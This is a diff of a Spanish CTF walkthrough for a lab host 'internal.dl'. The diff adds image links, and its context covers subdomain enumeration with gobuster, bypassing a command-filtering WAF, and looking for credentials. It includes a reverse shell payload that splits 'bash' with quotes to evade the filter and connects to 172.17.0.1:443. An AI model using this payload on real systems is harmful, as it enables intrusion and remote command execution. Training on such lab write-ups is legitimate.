@@ -22,14 +22,14 @@ Como en la página inicial no encontramos información relevante, pasaremos a bu
 gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://internal.dl/ --append-domain | grep 'Status: 200'
 ```
 Usamos ```grep``` para filtrar especificamente por los dominios que devuelvan status 200, de lo contrario en este caso se mostraran todos los dominios
-![]()
+![host search](images/img2.png)
 
 vemos que el ```backup.internal.dl``` devuelve status 200. 
 Al entrar, veremos que el servidor no devuelve contenido nuevamente, por lo que lo agregamos a ```/etc/hosts``` ```172.17.0.2 backup.internal.dl```
 
 ## Paso N3: Entendiendo el WAF
 Al entrar a la página, veremos que hay una consola, la cual solo nos permite ejecutar 5 comandos ya preestablecidos y abajo veremos una consola con el output
-![]()
+![WAF](images/img3.png)
 
 El WAF podemos entenderlo como una validación, el servidor valida el input que le damos, en caso de que pase los filtros, nos devolvera su respectivo output, en caso de que no pase los filtros nos dará un error, por lo que tenemos que buscar como saltarnos estos filtros para ejecutar nuestros propios comandos.
 
@@ -51,7 +51,7 @@ Una vez entendido los filtros de WAF, podemos ejecutar una reverse shell escucha
 /var/log | bas''h -c 'bas''h -i >& /dev/tcp/172.17.0.1/443 0>&1'
 ```
 tendremos acceso a la shell de la página.
-![]()
+![rev shell](images/img4.png)
 
 ## Paso N5: Buscando credenciales
 En el directorio ```/opt``` hay un archivo oculto llamado ```.vault_pass.txt``` y dentro tiene lo que parecer ser una wordlist
